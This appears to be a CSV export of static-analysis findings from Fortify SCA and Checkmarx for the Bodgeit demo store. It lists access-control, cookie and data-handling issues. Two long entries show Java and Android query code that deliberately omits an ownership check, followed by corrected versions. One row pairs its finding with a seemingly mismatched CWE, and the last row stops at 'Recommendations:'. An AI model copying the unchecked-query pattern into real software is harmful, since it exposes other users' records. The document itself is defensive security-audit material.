"DemoApps","","Bodgeit","129","Access Control: Database","","Low","Open","2015-10-15","Fortify SCA","566","Authorization Bypass Through User-Controlled SQL Primary Key","","root/contact.jsp","comments","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>Without proper access control, the method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> can execute a SQL statement on line <Replace key=""PrimaryLocation.line""/> that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.<AltParagraph>Without proper access control, executing a SQL statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.</AltParagraph></Paragraph></Content> Explanation: <Content>Database access control errors occur when: 1. Data enters a program from an untrusted source. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is used to specify the value of a primary key in a SQL query. <Paragraph> In this case the data is used by <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id); List invoices = stmt.getResultList(); ... </pre> <b>Example 2:</b> The following code demonstrates the same functionality as above, but maps the returned data to Persistence entities via annotations. It also uses named, rather than positional, parameters to construct its query. <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> <b>Example 3:</b> In this example, the code uses XML mappings, rather than annotations, to achieve the same effect as Example 2. <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The following code then executes the query in a separate Java source file. <pre> id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id); List invoices = stmt.list(); ... </pre> <b>Example 2:</b> In this example, the code uses a mappings file to generate named SQL query equivalent to the logic in Example 1. Likewise, named queries separate the SQL logic from the data and helps prevent SQL injection vulnerabilities. <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> <b>Example 3:</b> The following code implements similar functionality to the previous two examples in HQL. It uses Hibernate annotations in lieu of mappings files to generate named HQL queries. <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user. Some think that in the mobile world, classic web application vulnerabilities, such as database access control errors, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:javax.persistence trace:org.hibernate trace:net.sf.hibernate""> <b>Example 4:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>Rather than relying on the presentation layer to restrict values submitted by the user, access control should be handled by the application and database layers. Under no circumstances should a user be allowed to retrieve or modify a row in the database without the appropriate permissions. Every query that accesses the database should enforce this policy, which can often be accomplished by simply including the current authenticated username as part of the query. <IfNotDef var=""ConditionalDescriptions""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id).setParameter(1, userName); List invoices = stmt.getResultList(); ... </pre> <b>Example 6:</b> <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('invID', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> <b>Example 7:</b> <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID AND user = :userName&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The Java code then executes the query in another source file. <pre> userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('id', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id).setString(1, userName); List invoices = stmt.list(); ... </pre> <b>Example 6:</b> <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID AND user = :userName &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> <b>Example 7:</b> <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> And here is an Android equivalent: <pre> ... PasswordAuthentication pa = authenticator.getPasswordAuthentication(); String userName = pa.getUserName(); String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id, userName}); ... </pre></Content>","","",""
"DemoApps","","Bodgeit","222","Access Control: Database","","Low","Open","2015-10-15","Fortify SCA","566","Authorization Bypass Through User-Controlled SQL Primary Key","","root/contact.jsp","username","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>Without proper access control, the method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> can execute a SQL statement on line <Replace key=""PrimaryLocation.line""/> that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.<AltParagraph>Without proper access control, executing a SQL statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.</AltParagraph></Paragraph></Content> Explanation: <Content>Database access control errors occur when: 1. Data enters a program from an untrusted source. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is used to specify the value of a primary key in a SQL query. <Paragraph> In this case the data is used by <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id); List invoices = stmt.getResultList(); ... </pre> <b>Example 2:</b> The following code demonstrates the same functionality as above, but maps the returned data to Persistence entities via annotations. It also uses named, rather than positional, parameters to construct its query. <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> <b>Example 3:</b> In this example, the code uses XML mappings, rather than annotations, to achieve the same effect as Example 2. <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The following code then executes the query in a separate Java source file. <pre> id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id); List invoices = stmt.list(); ... </pre> <b>Example 2:</b> In this example, the code uses a mappings file to generate named SQL query equivalent to the logic in Example 1. Likewise, named queries separate the SQL logic from the data and helps prevent SQL injection vulnerabilities. <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> <b>Example 3:</b> The following code implements similar functionality to the previous two examples in HQL. It uses Hibernate annotations in lieu of mappings files to generate named HQL queries. <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user. Some think that in the mobile world, classic web application vulnerabilities, such as database access control errors, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:javax.persistence trace:org.hibernate trace:net.sf.hibernate""> <b>Example 4:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>Rather than relying on the presentation layer to restrict values submitted by the user, access control should be handled by the application and database layers. Under no circumstances should a user be allowed to retrieve or modify a row in the database without the appropriate permissions. Every query that accesses the database should enforce this policy, which can often be accomplished by simply including the current authenticated username as part of the query. <IfNotDef var=""ConditionalDescriptions""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id).setParameter(1, userName); List invoices = stmt.getResultList(); ... </pre> <b>Example 6:</b> <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('invID', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> <b>Example 7:</b> <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID AND user = :userName&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The Java code then executes the query in another source file. <pre> userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('id', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id).setString(1, userName); List invoices = stmt.list(); ... </pre> <b>Example 6:</b> <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID AND user = :userName &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> <b>Example 7:</b> <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> And here is an Android equivalent: <pre> ... PasswordAuthentication pa = authenticator.getPasswordAuthentication(); String userName = pa.getUserName(); String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id, userName}); ... </pre></Content>","","",""
"DemoApps","","Bodgeit","637","Plaintext_Storage_in_a_Cookie","","Low","Open","2015-10-15","Checkmarx","315","Cleartext Storage of Sensitive Information in a Cookie","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","586","Collapse_of_Data_into_Unsafe_Value","","Low","Open","2015-10-15","Checkmarx","182","Collapse of Data into Unsafe Value","","/bodgeit/root/contact.jsp","comments","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","632","Collapse_of_Data_into_Unsafe_Value","","Low","Open","2015-10-15","Checkmarx","182","Collapse of Data into Unsafe Value","","/bodgeit/root/contact.jsp","comments","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","634","Collapse_of_Data_into_Unsafe_Value","","Low","Open","2015-10-15","Checkmarx","182","Collapse of Data into Unsafe Value","","/bodgeit/root/contact.jsp","comments","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","162","Code Correctness: Byte Array to String Conversion","","Low","Open","2015-10-15","Fortify SCA","486","Comparison of Classes by Name","","src/com/thebodgeitstore/util/AES.java","","","http://localhost/src/com/thebodgeitstore/util/AES.java","","","","Abstract: <Content><Paragraph>The call to <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/> of <Replace key=""PrimaryLocation.file""/> converts a byte array into a <code>String</code>, which may lead to data loss.<AltParagraph>Converting a byte array into a <code>String</code> may lead to data loss.</AltParagraph></Paragraph></Content> Explanation: <Content>When data from a byte array is converted into a <code>String</code>, it is unspecified what will happen to any data that is outside of the applicable character set. This can lead to data being lost, or a decrease in the level of security when binary data is needed to ensure proper security measures are followed. <b>Example 1:</b> The following code converts data into a String in order to create a hash. <pre> ... FileInputStream fis = new FileInputStream(myFile); byte[] byteArr = byte[BUFSIZE]; ... int count = fis.read(byteArr); ... String fileString = new String(byteArr); String fileSHA256Hex = DigestUtils.sha256Hex(fileString); // use fileSHA256Hex to validate file ... </pre> Assuming the size of the file is less than <code>BUFSIZE</code>, this works fine as long as the information in <code>myFile</code> is encoded the same as the default character set, however if it's using a different encoding, or is a binary file, it will lose information. This in turn will cause the resulting SHA hash to be less reliable, and could mean it's far easier to cause collisions, especially if any data outside of the default character set is represented by the same value, such as a question mark.</Content>","Recommendations: 